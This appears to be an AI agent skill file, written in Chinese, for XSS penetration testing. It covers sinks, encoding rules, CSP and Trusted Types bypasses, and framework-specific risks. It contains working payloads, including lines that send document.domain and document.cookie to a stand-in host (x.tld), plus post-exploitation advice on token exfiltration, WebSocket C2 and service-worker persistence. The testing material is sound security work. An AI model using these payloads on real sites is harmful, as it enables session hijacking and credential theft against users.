---
name: xss
description: XSS 安全测试技能，覆盖反射型、存储型和 DOM 型向量，并包含 CSP 绕过技巧
---

# XSS / 跨站脚本

跨站脚本之所以长期存在，是因为上下文、解析器和框架边界都很复杂。任何受用户影响的字符串，在为精确落点完成严格编码并受运行时策略（CSP/Trusted Types）保护之前，都应视为不可信。

## 攻击面

**类型**
- 覆盖 Web、移动端和桌面壳中的反射型、存储型和基于 DOM 的 XSS

**上下文**
- HTML、属性、URL、JS、CSS、SVG/MathML、Markdown、PDF

**框架**
- React/Vue/Angular/Svelte 落点、模板引擎、SSR/ISR

**需绕过的防护**
- CSP/Trusted Types、DOMPurify、框架自动转义

## 注入点

**服务端渲染**
- 模板（Jinja/EJS/Handlebars）、SSR 框架、邮件/PDF 渲染器

**客户端渲染**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`、模板字面量
- `dangerouslySetInnerHTML`、`v-html`、`$sce.trustAsHtml`、Svelte `{@html}`

**URL/DOM**
- `location.hash`/`search`、`document.referrer`、base href、`data-*` 属性

**事件/处理器**
- `onerror`/`onload`/`onfocus`/`onclick` 和 `javascript:` URL 处理器

**跨上下文**
- postMessage 载荷、WebSocket 消息、local/sessionStorage、IndexedDB

**文件/元数据**
- 图片/SVG/XML 名称和 EXIF，服务端或客户端处理的 Office 文档

## 上下文编码规则

- **HTML 文本**：对 `< > & " '` 进行编码
- **属性值**：编码 `" ' < > &`，并确保属性被引号包裹；避免未加引号的属性
- **URL/JS URL**：编码并校验 scheme（白名单仅允许 https/mailto/tel）；禁止 javascript/data
- **JS 字符串**：转义引号、反斜杠和换行；优先使用 `JSON.stringify`
- **CSS**：避免注入到 style；清理属性名/值；注意 `url()` 和 `expression()`
- **SVG/MathML**：将其视为活动内容；许多标签会通过 onload 或动画事件执行

## 关键漏洞

### DOM XSS

**来源**
- `location.*`（hash/search）、`document.referrer`、postMessage、storage、service worker 消息

**落点**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`、`document.write`
- `setAttribute`、带字符串参数的 `setTimeout`/`setInterval`
- `eval`/`Function`、带 blob URL 的 `new Worker`

**易受攻击的模式**
```javascript
const q = new URLSearchParams(location.search).get('q');
results.innerHTML = `<li>${q}</li>`;
```
利用方式：`?q=<img src=x onerror=fetch('//x.tld/'+document.domain)>`

### 变异型 XSS

利用解析器修复机制，把看似安全的标记转换成可执行代码（例如 noscript、畸形标签）：
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>
<form><button formaction=javascript:alert(1)>
```

### 模板注入

服务端或客户端模板如果会求值表达式（AngularJS 旧版、Handlebars helpers、lodash templates）：
```
{{constructor.constructor('fetch(`//x.tld?c=`+document.cookie)')()}}
```

### CSP 绕过

- 脆弱策略：缺少 nonce/hash、存在通配符、允许 `data:`/`blob:`、允许内联事件
- 脚本 gadget：JSONP 端点、暴露函数构造器的库
- import maps 或 modulepreload 策略过松
- 注入 base 标签，改写相对脚本 URL
- 在允许的来源上动态导入模块

### Trusted Types 绕过

- 自定义策略返回未清理字符串；滥用策略白名单
- Trusted Types 未覆盖的落点（CSS、URL 处理器），再借助 gadget 转移攻击

## 多态载荷

Keep a compact set tuned per context:
- **HTML node**: `<svg onload=alert(1)>`
- **Attr quoted**: `" autofocus onfocus=alert(1) x="`
- **Attr unquoted**: `onmouseover=alert(1)`
- **JS string**: `"-alert(1)-"`
- **URL**: `javascript:alert(1)`

## 框架特定

### React

- 主要落点：`dangerouslySetInnerHTML`
- 次要落点：从不可信输入设置事件处理器或 URL
- 绕过模式：通过库输出未清理 HTML；使用 innerHTML 的自定义渲染器

### Vue

- 落点：`v-html` 和动态属性绑定
- SSR hydration 不匹配时可能重新解释内容

### Angular

- 旧版表达式注入（1.6 之前）
- 误用 `$sce` 信任 API，白名单化了攻击者内容

### Svelte

- 落点：`{@html}` 和动态属性

### Markdown/Richtext

- 渲染器通常允许 HTML 透传；插件可能重新启用原始 HTML
- 在渲染后进行清理；禁止内联 HTML，或仅允许安全白名单

## 特殊场景

### Email

- 大多数客户端会移除脚本，但允许 CSS/远程内容
- 只有在相关时才使用 CSS/URL 技巧；不要默认 JS 会执行

### PDF 和文档

- PDF 引擎可能在注释或链接中执行 JS
- 测试链接和提交动作中的 `javascript:`

### 文件上传

- 以 `text/html` 或 `image/svg+xml` 提供的 SVG/HTML 上传内容可能会内联执行
- 验证 content-type 和 `Content-Disposition: attachment`
- 混合 MIME 与嗅探绕过；确保 `X-Content-Type-Options: nosniff`

## 利用后

- 会话/令牌外传：为可靠性优先使用 fetch/XHR，而不是图片 beacon
- 实时控制：使用带严格命令集的 WebSocket C2
- 持久化：注册 service worker；借助 localStorage/script gadget 重新注入
- 影响：角色劫持、CSRF 链式利用、通过 fetch 扫描内网端口、凭据钓鱼覆盖层

## 测试方法

1. **识别来源** - URL/query/hash/referrer、postMessage、storage、WebSocket、服务器 JSON
2. **追踪到落点** - 映射从来源到落点的数据流
3. **分类上下文** - HTML 节点、属性、URL、脚本块、事件处理器、类 JS eval、CSS、SVG
4. **评估防护** - 输出编码、清理器、CSP、Trusted Types、DOMPurify 配置
5. **构造载荷** - 针对每种上下文使用最小载荷，并变化编码/空白/大小写
6. **多通道** - 在 REST、GraphQL、WebSocket、SSE、service worker 中测试

## 验证

1. 提供最小载荷和上下文（落点类型），并给出 DOM 或网络前后证据
2. 在相关场景下展示跨浏览器执行，或者解释解析器特定行为
3. 用证据展示对所述防护（清理器配置、CSP/Trusted Types）的绕过
4. 量化影响，不止是弹窗：访问了哪些数据、执行了什么动作、获得了何种持久化

## 误报

- 反射内容已在精确上下文中安全编码
- CSP 使用 nonce/hash，且没有内联/事件处理器
- 落点强制启用 Trusted Types；DOMPurify 使用严格模式和 URI 白名单
- 可脚本化上下文已禁用（无 HTML 透传、强制安全 URL scheme）

## 影响

- 会话劫持和凭据窃取
- 通过令牌外传实现账户接管
- 通过 CSRF 链接执行状态变更操作
- 恶意软件分发和钓鱼
- 通过 service worker 实现持久化控制

## 实战技巧

1. 先做上下文分类，而不是盲目爆破载荷
2. 使用 DOM instrumentation 记录落点调用，它能揭示意料之外的数据流
3. 保持每个上下文一小组精心挑选的载荷，并持续变化编码
4. 通过配置检查和负面测试来验证防护
5. 优先采用以影响为导向的 PoC（外传、CSRF 链）而不是弹窗
6. 将 SVG/MathML 视作一等公民级的活动内容，单独测试
7. 在不同传输和渲染路径下重跑测试（SSR vs CSR vs hydration）
8. 把 CSP/Trusted Types 当作功能来测试：尝试违反策略并记录违规报告

## 总结

上下文 + 落点决定执行方式。为精确上下文进行编码，在运行时借助 CSP/Trusted Types 验证，并检查每一种替代渲染路径。小载荷加强证据，胜过载荷目录。
